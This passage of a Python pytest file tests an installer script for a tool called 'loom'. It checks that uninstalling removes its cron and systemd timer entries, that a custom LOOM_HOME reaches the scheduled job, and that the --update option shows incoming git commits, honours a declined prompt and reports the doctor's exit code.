    assert CRON_TAG not in content
    assert "loom process" not in content
    assert "LOOM_HOME=" not in content
    assert "other.sh" in content
    # a backup was taken before the removal, too
    assert list((home / ".loom" / "backup").glob("crontab.*"))


def test_uninstall_trigger_is_a_no_op_when_nothing_is_installed(tmp_path, home):
    state = tmp_path / "cron.txt"
    state.write_text("# mine\n@daily /usr/local/bin/other.sh\n")
    _crontab_shim(tmp_path, state)

    proc = _run(tmp_path, "--uninstall-trigger")

    assert proc.returncode == 0, proc.stderr
    assert state.read_text() == "# mine\n@daily /usr/local/bin/other.sh\n"
    assert "nothing to remove" in proc.stdout


def test_uninstall_trigger_removes_the_systemd_units(tmp_path, home):
    sysd_log = tmp_path / "systemctl.log"
    _systemctl_shim(tmp_path, sysd_log)
    _crontab_shim(tmp_path, tmp_path / "cron.txt")
    assert _run(tmp_path).returncode == 0
    unit_dir = home / ".config" / "systemd" / "user"
    assert (unit_dir / "loom-process.timer").is_file()

    proc = _run(tmp_path, "--uninstall-trigger")

    assert proc.returncode == 0, proc.stderr
    assert not (unit_dir / "loom-process.timer").exists()
    assert not (unit_dir / "loom-process.service").exists()
    assert "disable --now loom-process.timer" in sysd_log.read_text()


def test_uninstall_trigger_does_not_run_the_installer(tmp_path, home):
    _crontab_shim(tmp_path, tmp_path / "cron.txt")

    proc = _run(tmp_path, "--uninstall-trigger")

    assert proc.returncode == 0, proc.stderr
    assert not (home / ".claude" / "settings.json").exists()
    assert not (home / ".loom" / "hooks").exists()


# --------------------------------------------------------------------------- #
# MEDIUM-5: a non-default LOOM_HOME must reach the trigger on BOTH branches    #
# --------------------------------------------------------------------------- #
def test_cron_entry_carries_a_non_default_loom_home(tmp_path, home):
    """cron's environment has no LOOM_HOME, so without the assignment the periodic pass
    would work on ~/.loom — a different queue, config and token than the install."""
    state = tmp_path / "cron.txt"
    _crontab_shim(tmp_path, state)
    custom = tmp_path / "data" / "loom"

    proc = _run(tmp_path, LOOM_HOME=str(custom))

    assert proc.returncode == 0, proc.stderr
    lines = state.read_text().splitlines()
    assert f"LOOM_HOME={custom}" in lines
    assert f"*/15 * * * * {custom}/venv/bin/loom process --quiet" in lines


def test_systemd_unit_resolves_a_non_default_loom_home(tmp_path, home):
    """The shipped unit is static (%h/.loom) and a systemd *user* service inherits the user
    manager's environment, not the installing shell's."""
    _systemctl_shim(tmp_path, tmp_path / "systemctl.log")
    _crontab_shim(tmp_path, tmp_path / "cron.txt")
    custom = tmp_path / "data" / "loom"

    proc = _run(tmp_path, LOOM_HOME=str(custom))

    assert proc.returncode == 0, proc.stderr
    unit = (home / ".config" / "systemd" / "user" / "loom-process.service").read_text()
    assert f"ExecStart={custom}/venv/bin/loom process --quiet" in unit
    assert f"Environment=LOOM_HOME={custom}" in unit
    assert "%h/.loom" not in unit
    # the [Service] section still parses: exactly one of each directive, under [Service]
    body = unit.split("[Service]", 1)[1]
    assert body.count("ExecStart=") == 1
    assert body.count("Environment=LOOM_HOME=") == 1


# --------------------------------------------------------------------------- #
# MEDIUM-3: --update shows what it is about to run                            #
# --------------------------------------------------------------------------- #
def test_update_prints_the_incoming_commits_before_pulling(tmp_path, home):
    _crontab_shim(tmp_path, tmp_path / "cron.txt")
    work = _mini_checkout(tmp_path)
    _loom_stub(home / ".loom", exit_code=0, record=tmp_path / "doctor_argv.txt")
    # upstream moves
    env = {**os.environ, **GIT_ENV}
    origin_work = tmp_path / "origin_work"
    marker = origin_work / "client" / "hooks" / "sessionend.sh"
    marker.write_text(marker.read_text() + "\n# upstream-marker\n")
    subprocess.run(["git", "commit", "-aqm", "upstream: add marker"], cwd=origin_work,
                   check=True, env=env)

    proc = _run(tmp_path, "--update", script=work / "client" / "install.sh")

    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "Incoming commits" in proc.stdout
    assert "upstream: add marker" in proc.stdout
    assert "# upstream-marker" in (work / "client" / "hooks" / "sessionend.sh").read_text()


def test_update_without_yes_aborts_when_declined(tmp_path, home):
    """The prompt only appears without --yes; declining changes nothing."""
    _crontab_shim(tmp_path, tmp_path / "cron.txt")
    work = _mini_checkout(tmp_path)
    _loom_stub(home / ".loom", exit_code=0, record=tmp_path / "doctor_argv.txt")
    env = {**os.environ, **GIT_ENV}
    origin_work = tmp_path / "origin_work"
    marker = origin_work / "client" / "hooks" / "sessionend.sh"
    marker.write_text(marker.read_text() + "\n# upstream-marker\n")
    subprocess.run(["git", "commit", "-aqm", "upstream: add marker"], cwd=origin_work,
                   check=True, env=env)

    home.mkdir(exist_ok=True)
    proc = subprocess.run(
        ["bash", str(work / "client" / "install.sh"), "--update"],
        env={**os.environ, "HOME": str(home), "LOOM_HOME": str(home / ".loom"),
             "LOOM_SKIP_VENV": "1", "LOOM_SKIP_GITLEAKS": "1", "PATH": _sandbox_path(tmp_path), **GIT_ENV},
        input="n\n", capture_output=True, text=True, timeout=180,
    )

    assert proc.returncode == 0, proc.stderr
    assert "Aborted" in proc.stdout
    assert "# upstream-marker" not in (work / "client" / "hooks" /
                                       "sessionend.sh").read_text(), "it pulled anyway"
    assert not (tmp_path / "doctor_argv.txt").exists(), "doctor ran after an abort"


# --------------------------------------------------------------------------- #
# --update (R2.4.1)                                                            #
# --------------------------------------------------------------------------- #
def test_update_outside_a_git_checkout_fails_cleanly(tmp_path, home):
    _crontab_shim(tmp_path, tmp_path / "cron.txt")
    loose = tmp_path / "loose"
    (loose / "client").mkdir(parents=True)
    shutil.copyfile(INSTALL_SCRIPT, loose / "client" / "install.sh")

    proc = _run(tmp_path, "--update", script=loose / "client" / "install.sh")

    assert proc.returncode == 1
    assert "git checkout" in proc.stderr
    assert not (tmp_path / "cron.txt").exists(), "it must fail before touching anything"


def test_update_exits_with_doctors_exit_code(tmp_path, home):
    _crontab_shim(tmp_path, tmp_path / "cron.txt")
    work = _mini_checkout(tmp_path)
    record = tmp_path / "doctor_argv.txt"
    _loom_stub(home / ".loom", exit_code=3, record=record)

    proc = _run(tmp_path, "--update", script=work / "client" / "install.sh")

    assert proc.returncode == 3, proc.stdout + proc.stderr
    assert record.read_text().strip() == "doctor"
    # the pull + re-copy + trigger all ran before the doctor
    assert "0/5" in proc.stdout and "3/5" in proc.stdout
    assert CRON_TAG in (tmp_path / "cron.txt").read_text()


def test_update_keeps_the_existing_venv(tmp_path, home):
    """--update must not rebuild the venv (the editable install picks the pull up)."""
    _crontab_shim(tmp_path, tmp_path / "cron.txt")
    work = _mini_checkout(tmp_path)
    _loom_stub(home / ".loom", exit_code=0, record=tmp_path / "doctor_argv.txt")

    proc = _run(tmp_path, "--update", script=work / "client" / "install.sh",
                LOOM_SKIP_VENV="0")

    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "keeping the existing venv" in proc.stdout
    assert not (home / ".loom" / "venv" / "pyvenv.cfg").exists()


def test_update_without_an_installed_cli_fails_with_instructions(tmp_path, home):
    _crontab_shim(tmp_path, tmp_path / "cron.txt")
    work = _mini_checkout(tmp_path)

    proc = _run(tmp_path, "--update", script=work / "client" / "install.sh")

    assert proc.returncode == 1
    assert "without --update first" in proc.stderr
